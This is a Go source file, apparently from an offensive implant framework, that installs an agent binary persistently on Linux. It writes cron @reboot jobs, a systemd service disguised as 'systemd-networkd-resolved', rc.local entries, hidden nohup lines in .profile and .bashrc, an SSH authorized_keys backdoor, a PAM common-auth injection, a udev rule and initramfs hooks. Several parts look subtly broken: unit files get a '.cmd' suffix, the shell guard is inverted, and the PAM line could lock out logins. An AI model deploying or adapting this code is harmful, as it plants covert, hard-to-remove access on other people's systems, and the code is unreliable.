package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/angel-platform/angel/pkg/types"
)

type LinuxBaseMethod struct {
	BaseMethod
}

type LinuxCronJobMethod struct {
	LinuxBaseMethod
}

func NewLinuxCronJobMethod() *LinuxCronJobMethod {
	return &LinuxCronJobMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "cron_job",
				platform:         types.PlatformLinux,
				requiresElevation: false,
			},
		},
	}
}

func (m *LinuxCronJobMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("cron job method only available on Linux")
	}

	cronLine := fmt.Sprintf("@reboot %s %s", params.AgentPath, params.AgentArgs)

	cmd := exec.Command("crontab", "-l")
	existing, _ := cmd.Output()
	if strings.Contains(string(existing), params.AgentPath) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodCronJob,
			Details: map[string]string{
				"cron_line": cronLine,
				"status":    "already_installed",
			},
		}, nil
	}

	newCron := string(existing) + "\n" + cronLine + "\n"
	cmd = exec.Command("bash", "-c", fmt.Sprintf("echo '%s' | crontab -", newCron))
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to install cron job: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodCronJob,
		Details: map[string]string{
			"cron_line": cronLine,
		},
	}, nil
}

func (m *LinuxCronJobMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("cron job method only available on Linux")
	}

	cmd := exec.Command("crontab", "-l")
	existing, err := cmd.Output()
	if err != nil {
		return nil
	}

	lines := strings.Split(string(existing), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, params.AgentPath) {
			newLines = append(newLines, line)
		}
	}

	newCron := strings.Join(newLines, "\n")
	cmd = exec.Command("bash", "-c", fmt.Sprintf("echo '%s' | crontab -", newCron))
	_, err = cmd.CombinedOutput()
	return err
}

func (m *LinuxCronJobMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("cron job method only available on Linux")
	}

	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), params.AgentPath), nil
}

type SystemdServiceMethod struct {
	LinuxBaseMethod
}

func NewSystemdServiceMethod() *SystemdServiceMethod {
	return &SystemdServiceMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "systemd_service",
				platform:         types.PlatformLinux,
				requiresElevation: true,
			},
		},
	}
}

func (m *SystemdServiceMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("systemd service method only available on Linux")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "systemd-networkd-resolved"
	}

	unitContent := fmt.Sprintf(`[Unit]
Description=Network Configuration Resolver
After=network.target

[Service]
Type=simple
ExecStart=%s %s
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
`, params.AgentPath, params.AgentArgs)

	servicePath := filepath.Join("/etc/systemd/system", serviceName+".cmd")

	if err := os.WriteFile(servicePath, []byte(unitContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write service file: %w", err)
	}

	cmd := exec.Command("systemctl", "daemon-reload")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to reload daemon: %w: %s", err, string(output))
	}

	cmd = exec.Command("systemctl", "enable", serviceName)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to enable service: %w: %s", err, string(output))
	}

	cmd = exec.Command("systemctl", "start", serviceName)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to start service: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodSystemdService,
		Details: map[string]string{
			"service_name": serviceName,
			"service_path": servicePath,
		},
	}, nil
}

func (m *SystemdServiceMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("systemd service method only available on Linux")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "systemd-networkd-resolved"
	}

	servicePath := filepath.Join("/etc/systemd/system", serviceName+".cmd")

	cmd := exec.Command("systemctl", "stop", serviceName)
	cmd.CombinedOutput()

	cmd = exec.Command("systemctl", "disable", serviceName)
	cmd.CombinedOutput()

	return os.Remove(servicePath)
}

func (m *SystemdServiceMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("systemd service method only available on Linux")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "systemd-networkd-resolved"
	}

	servicePath := filepath.Join("/etc/systemd/system", serviceName+".cmd")
	_, err := os.Stat(servicePath)
	return err == nil, nil
}

type RCLocalMethod struct {
	LinuxBaseMethod
}

func NewRCLocalMethod() *RCLocalMethod {
	return &RCLocalMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "rc_local",
				platform:         types.PlatformLinux,
				requiresElevation: true,
			},
		},
	}
}

func (m *RCLocalMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("rc.local method only available on Linux")
	}

	rcPath := "/etc/rc.local"
	rcLine := fmt.Sprintf("%s %s &\nexit 0\n", params.AgentPath, params.AgentArgs)

	var existingContent []byte
	if data, err := os.ReadFile(rcPath); err == nil {
		existingContent = data
	}

	if strings.Contains(string(existingContent), params.AgentPath) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodRCLocal,
			Details: map[string]string{
				"rc_path": rcPath,
				"status":  "already_installed",
			},
		}, nil
	}

	newContent := string(existingContent) + "\n" + rcLine
	if err := os.WriteFile(rcPath, []byte(newContent), 0755); err != nil {
		return nil, fmt.Errorf("failed to write rc.local: %w", err)
	}

	cmd := exec.Command("chmod", "+x", rcPath)
	cmd.CombinedOutput()

	return &PersistenceResult{
		Success: true,
		Method:  MethodRCLocal,
		Details: map[string]string{
			"rc_path": rcPath,
		},
	}, nil
}

func (m *RCLocalMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("rc.local method only available on Linux")
	}

	rcPath := "/etc/rc.local"
	content, err := os.ReadFile(rcPath)
	if err != nil {
		return nil
	}

	lines := strings.Split(string(content), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, params.AgentPath) {
			newLines = append(newLines, line)
		}
	}

	return os.WriteFile(rcPath, []byte(strings.Join(newLines, "\n")), 0755)
}

func (m *RCLocalMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("rc.local method only available on Linux")
	}

	rcPath := "/etc/rc.local"
	content, err := os.ReadFile(rcPath)
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(content), params.AgentPath), nil
}

type ProfileScriptMethod struct {
	LinuxBaseMethod
}

func NewProfileScriptMethod() *ProfileScriptMethod {
	return &ProfileScriptMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "profile_script",
				platform:         types.PlatformLinux,
				requiresElevation: false,
			},
		},
	}
}

func (m *ProfileScriptMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("profile script method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get home directory: %w", err)
	}

	profilePath := filepath.Join(homeDir, ".profile")
	scriptLine := fmt.Sprintf("[ -f %s ] || (nohup %s %s > /dev/null 2>&1 &)", params.AgentPath, params.AgentPath, params.AgentArgs)

	var existingContent []byte
	if data, err := os.ReadFile(profilePath); err == nil {
		existingContent = data
	}

	if strings.Contains(string(existingContent), params.AgentPath) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodProfileScript,
			Details: map[string]string{
				"profile_path": profilePath,
				"status":       "already_installed",
			},
		}, nil
	}

	newContent := string(existingContent) + "\n" + scriptLine + "\n"
	if err := os.WriteFile(profilePath, []byte(newContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write .profile: %w", err)
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodProfileScript,
		Details: map[string]string{
			"profile_path": profilePath,
		},
	}, nil
}

func (m *ProfileScriptMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("profile script method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	profilePath := filepath.Join(homeDir, ".profile")
	content, err := os.ReadFile(profilePath)
	if err != nil {
		return nil
	}

	lines := strings.Split(string(content), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, params.AgentPath) {
			newLines = append(newLines, line)
		}
	}

	return os.WriteFile(profilePath, []byte(strings.Join(newLines, "\n")), 0644)
}

func (m *ProfileScriptMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("profile script method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return false, err
	}

	profilePath := filepath.Join(homeDir, ".profile")
	content, err := os.ReadFile(profilePath)
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(content), params.AgentPath), nil
}

type BashrcMethod struct {
	LinuxBaseMethod
}

func NewBashrcMethod() *BashrcMethod {
	return &BashrcMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "bashrc",
				platform:         types.PlatformLinux,
				requiresElevation: false,
			},
		},
	}
}

func (m *BashrcMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("bashrc method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get home directory: %w", err)
	}

	bashrcPath := filepath.Join(homeDir, ".bashrc")
	scriptLine := fmt.Sprintf("[ -f %s ] || (nohup %s %s > /dev/null 2>&1 &)", params.AgentPath, params.AgentPath, params.AgentArgs)

	var existingContent []byte
	if data, err := os.ReadFile(bashrcPath); err == nil {
		existingContent = data
	}

	if strings.Contains(string(existingContent), params.AgentPath) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodBashrc,
			Details: map[string]string{
				"bashrc_path": bashrcPath,
				"status":      "already_installed",
			},
		}, nil
	}

	newContent := string(existingContent) + "\n" + scriptLine + "\n"
	if err := os.WriteFile(bashrcPath, []byte(newContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write .bashrc: %w", err)
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodBashrc,
		Details: map[string]string{
			"bashrc_path": bashrcPath,
		},
	}, nil
}

func (m *BashrcMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("bashrc method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	bashrcPath := filepath.Join(homeDir, ".bashrc")
	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return nil
	}

	lines := strings.Split(string(content), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, params.AgentPath) {
			newLines = append(newLines, line)
		}
	}

	return os.WriteFile(bashrcPath, []byte(strings.Join(newLines, "\n")), 0644)
}

func (m *BashrcMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("bashrc method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return false, err
	}

	bashrcPath := filepath.Join(homeDir, ".bashrc")
	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(content), params.AgentPath), nil
}

type LinuxSSHKeysMethod struct {
	LinuxBaseMethod
}

func NewLinuxSSHKeysMethod() *LinuxSSHKeysMethod {
	return &LinuxSSHKeysMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "ssh_keys",
				platform:         types.PlatformLinux,
				requiresElevation: false,
			},
		},
	}
}

func (m *LinuxSSHKeysMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("SSH keys method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get home directory: %w", err)
	}

	sshDir := filepath.Join(homeDir, ".ssh")
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		return nil, fmt.Errorf("failed to create .ssh directory: %w", err)
	}

	authorizedKeysPath := filepath.Join(sshDir, "authorized_keys")

	pubKey := params.Extra["public_key"]
	if pubKey == "" {
		return nil, fmt.Errorf("public_key is required in extra params")
	}

	var existingContent []byte
	if data, err := os.ReadFile(authorizedKeysPath); err == nil {
		existingContent = data
	}

	if strings.Contains(string(existingContent), pubKey) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodSSHKeys,
			Details: map[string]string{
				"authorized_keys": authorizedKeysPath,
				"status":          "already_installed",
			},
		}, nil
	}

	newContent := string(existingContent) + pubKey + "\n"
	if err := os.WriteFile(authorizedKeysPath, []byte(newContent), 0600); err != nil {
		return nil, fmt.Errorf("failed to write authorized_keys: %w", err)
	}

	cmd := exec.Command("chmod", "600", authorizedKeysPath)
	cmd.CombinedOutput()

	return &PersistenceResult{
		Success: true,
		Method:  MethodSSHKeys,
		Details: map[string]string{
			"authorized_keys": authorizedKeysPath,
		},
	}, nil
}

func (m *LinuxSSHKeysMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("SSH keys method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	authorizedKeysPath := filepath.Join(homeDir, ".ssh", "authorized_keys")
	content, err := os.ReadFile(authorizedKeysPath)
	if err != nil {
		return nil
	}

	pubKey := params.Extra["public_key"]
	lines := strings.Split(string(content), "\n")
	var newLines []string
	for _, line := range lines {
		if line != pubKey {
			newLines = append(newLines, line)
		}
	}

	return os.WriteFile(authorizedKeysPath, []byte(strings.Join(newLines, "\n")), 0600)
}

func (m *LinuxSSHKeysMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("SSH keys method only available on Linux")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return false, err
	}

	authorizedKeysPath := filepath.Join(homeDir, ".ssh", "authorized_keys")
	content, err := os.ReadFile(authorizedKeysPath)
	if err != nil {
		return false, nil
	}

	pubKey := params.Extra["public_key"]
	if pubKey == "" {
		return false, nil
	}
	return strings.Contains(string(content), pubKey), nil
}

type PAMModuleMethod struct {
	LinuxBaseMethod
}

func NewPAMModuleMethod() *PAMModuleMethod {
	return &PAMModuleMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "pam_module",
				platform:         types.PlatformLinux,
				requiresElevation: true,
			},
		},
	}
}

func (m *PAMModuleMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("PAM module method only available on Linux")
	}

	pamPath := "/etc/pam.d/common-auth"
	pamLine := fmt.Sprintf("auth    required    %s", params.AgentPath)

	var existingContent []byte
	if data, err := os.ReadFile(pamPath); err == nil {
		existingContent = data
	}

	if strings.Contains(string(existingContent), params.AgentPath) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodPAMModule,
			Details: map[string]string{
				"pam_path": pamPath,
				"status":   "already_installed",
			},
		}, nil
	}

	newContent := pamLine + "\n" + string(existingContent)
	if err := os.WriteFile(pamPath, []byte(newContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write PAM config: %w", err)
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodPAMModule,
		Details: map[string]string{
			"pam_path": pamPath,
		},
	}, nil
}

func (m *PAMModuleMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("PAM module method only available on Linux")
	}

	pamPath := "/etc/pam.d/common-auth"
	content, err := os.ReadFile(pamPath)
	if err != nil {
		return nil
	}

	lines := strings.Split(string(content), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, params.AgentPath) {
			newLines = append(newLines, line)
		}
	}

	return os.WriteFile(pamPath, []byte(strings.Join(newLines, "\n")), 0644)
}

func (m *PAMModuleMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("PAM module method only available on Linux")
	}

	pamPath := "/etc/pam.d/common-auth"
	content, err := os.ReadFile(pamPath)
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(content), params.AgentPath), nil
}

type UdevRuleMethod struct {
	LinuxBaseMethod
}

func NewUdevRuleMethod() *UdevRuleMethod {
	return &UdevRuleMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "udev_rule",
				platform:         types.PlatformLinux,
				requiresElevation: true,
			},
		},
	}
}

func (m *UdevRuleMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("udev rule method only available on Linux")
	}

	rulePath := "/etc/udev/rules.d/99-persistence.rules"
	ruleContent := fmt.Sprintf(`ACTION=="add", SUBSYSTEM=="net", RUN+="%s %s"
`, params.AgentPath, params.AgentArgs)

	var existingContent []byte
	if data, err := os.ReadFile(rulePath); err == nil {
		existingContent = data
	}

	if strings.Contains(string(existingContent), params.AgentPath) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodUdevRule,
			Details: map[string]string{
				"rule_path": rulePath,
				"status":    "already_installed",
			},
		}, nil
	}

	newContent := string(existingContent) + ruleContent
	if err := os.WriteFile(rulePath, []byte(newContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write udev rule: %w", err)
	}

	cmd := exec.Command("udevadm", "control", "--reload-rules")
	cmd.CombinedOutput()

	return &PersistenceResult{
		Success: true,
		Method:  MethodUdevRule,
		Details: map[string]string{
			"rule_path": rulePath,
		},
	}, nil
}

func (m *UdevRuleMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("udev rule method only available on Linux")
	}

	rulePath := "/etc/udev/rules.d/99-persistence.rules"
	if err := os.Remove(rulePath); err != nil {
		return err
	}

	cmd := exec.Command("udevadm", "control", "--reload-rules")
	_, err := cmd.CombinedOutput()
	return err
}

func (m *UdevRuleMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("udev rule method only available on Linux")
	}

	rulePath := "/etc/udev/rules.d/99-persistence.rules"
	content, err := os.ReadFile(rulePath)
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(content), params.AgentPath), nil
}

type InitramfsHookMethod struct {
	LinuxBaseMethod
}

func NewInitramfsHookMethod() *InitramfsHookMethod {
	return &InitramfsHookMethod{
		LinuxBaseMethod: LinuxBaseMethod{
			BaseMethod: BaseMethod{
				name:             "initramfs_hook",
				platform:         types.PlatformLinux,
				requiresElevation: true,
			},
		},
	}
}

func (m *InitramfsHookMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("initramfs hook method only available on Linux")
	}

	hookScript := fmt.Sprintf(`#!/bin/sh
PREREQ=""
prereqs()
{
    echo "$PREREQ"
}
case $1 in
    prereqs)
        prereqs
        exit 0
        ;;
esac

. /usr/share/initramfs-tools/hook-functions

copy_exec %s /usr/bin
`, params.AgentPath)

	hookPath := "/etc/initramfs-tools/hooks/persistence"
	if err := os.WriteFile(hookPath, []byte(hookScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write initramfs hook: %w", err)
	}

	runScript := fmt.Sprintf(`#!/bin/sh
PREREQ=""
prereqs()
{
    echo "$PREREQ"
}
case $1 in
    prereqs)
        prereqs
        exit 0
        ;;
esac

%s %s &
`, params.AgentPath, params.AgentArgs)

	runPath := "/etc/initramfs-tools/scripts/local-premount/persistence"
	if err := os.MkdirAll(filepath.Dir(runPath), 0755); err != nil {
		return nil, fmt.Errorf("failed to create hook directory: %w", err)
	}

	if err := os.WriteFile(runPath, []byte(runScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write initramfs run script: %w", err)
	}

	cmd := exec.Command("update-initramfs", "-u")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to update initramfs: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodInitramfsHook,
		Details: map[string]string{
			"hook_path": hookScript,
			"run_path":  runPath,
		},
	}, nil
}

func (m *InitramfsHookMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("initramfs hook method only available on Linux")
	}

	os.Remove("/etc/initramfs-tools/hooks/persistence")
	os.Remove("/etc/initramfs-tools/scripts/local-premount/persistence")

	cmd := exec.Command("update-initramfs", "-u")
	_, err := cmd.CombinedOutput()
	return err
}

func (m *InitramfsHookMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("initramfs hook method only available on Linux")
	}

	hookPath := "/etc/initramfs-tools/hooks/persistence"
	_, err := os.Stat(hookPath)
	return err == nil, nil
}

func getLinuxEnvVar(name string) string {
	return os.Getenv(name)
}

func getLinuxUserHome() string {
	if u, err := user.Current(); err == nil {
		return u.HomeDir
	}
	home := os.Getenv("HOME")
	if home == "" {
		home = "/root"
	}
	return home
}
